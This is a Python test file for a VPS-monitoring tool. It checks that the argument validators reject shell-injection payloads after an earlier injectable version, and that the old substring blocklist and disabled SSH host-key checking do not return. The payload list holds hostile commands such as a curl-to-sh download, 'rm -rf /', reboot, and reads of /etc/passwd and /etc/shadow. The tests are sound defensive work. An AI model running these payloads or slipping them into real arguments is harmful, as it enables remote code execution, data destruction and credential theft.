"""The tools build shell commands. These tests exist because one of them was injectable.

Before this suite, `vps_read_logs` interpolated its arguments straight into a string
that a remote shell executed, and the only screening was a blocklist of dangerous
substrings. A service name of `web; curl example.com/x | sh` ran, and the blocklist
never matched because it enumerates what its author thought of.

Every payload below is a real way to break out of that command line.
"""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

MODULE_PATH = (
    Path(__file__).resolve().parent.parent / "servers" / "vps-monitor" / "validation.py"
)
spec = importlib.util.spec_from_file_location("vps_validation", MODULE_PATH)
validation = importlib.util.module_from_spec(spec)
spec.loader.exec_module(validation)

InvalidArgument = validation.InvalidArgument

# Each entry is a shell metacharacter or construct that would change the meaning
# of the command it lands in.
INJECTION_PAYLOADS = [
    "web; curl example.com/x | sh",
    "web && rm -rf /",
    "web || reboot",
    "web | tee /tmp/out",
    "web`whoami`",
    "web$(whoami)",
    "web${IFS}cat${IFS}/etc/passwd",
    "web\nreboot",
    "web > /dev/sda",
    "web < /etc/shadow",
    "web & sleep 60",
    "../../etc/passwd",
    "web'; touch /tmp/pwned; '",
    'web"; touch /tmp/pwned; "',
    "web #comment",
    "web\\; reboot",
    "*",
    "",
    " ",
    "-rf",
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=repr)
def test_service_name_rejects_injection(payload: str) -> None:
    with pytest.raises(InvalidArgument):
        validation.valid_service(payload)


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=repr)
def test_since_rejects_injection(payload: str) -> None:
    with pytest.raises(InvalidArgument):
        validation.valid_since(payload)


@pytest.mark.parametrize(
    "name", ["nginx", "web-1", "app_api", "postgres.main", "a", "A9", "x" * 64]
)
def test_service_name_accepts_real_container_names(name: str) -> None:
    assert validation.valid_service(name) == name


def test_service_name_rejects_an_over_long_name() -> None:
    with pytest.raises(InvalidArgument):
        validation.valid_service("x" * 65)


@pytest.mark.parametrize("window", ["30m", "12h", "7d", "60s", "2w", "2026-08-20"])
def test_since_accepts_real_windows(window: str) -> None:
    assert validation.valid_since(window) == window


@pytest.mark.parametrize("lines", [1, 50, 5000])
def test_lines_accepts_sane_values(lines: int) -> None:
    assert validation.valid_lines(lines) == str(lines)


@pytest.mark.parametrize("lines", [0, -1, 5001, 10**9])
def test_lines_rejects_out_of_range(lines: int) -> None:
    with pytest.raises(InvalidArgument):
        validation.valid_lines(lines)


def test_lines_rejects_a_string_that_looks_numeric() -> None:
    """A bool is an int in Python and a string is not; neither may pass silently."""
    with pytest.raises(InvalidArgument):
        validation.valid_lines("50; reboot")


def test_the_blocklist_is_gone() -> None:
    """Regression guard: the blocklist gave false confidence and must not come back."""
    server = (
        Path(__file__).resolve().parent.parent
        / "servers"
        / "vps-monitor"
        / "server.py"
    ).read_text(encoding="utf-8")
    assert "BLOCKED_PATTERNS" not in server, (
        "The substring blocklist is back. It never was a control: it screens the "
        "patterns its author remembered, and an injected argument does not have to "
        "use any of them. Validate arguments against an allowlist instead."
    )


def test_ssh_does_not_disable_host_key_checking() -> None:
    server = (
        Path(__file__).resolve().parent.parent
        / "servers"
        / "vps-monitor"
        / "server.py"
    ).read_text(encoding="utf-8")
    assert "StrictHostKeyChecking=no" not in server, (
        "StrictHostKeyChecking=no accepts any host key, which removes the only "
        "defence against a machine-in-the-middle on this connection. Use accept-new."
    )
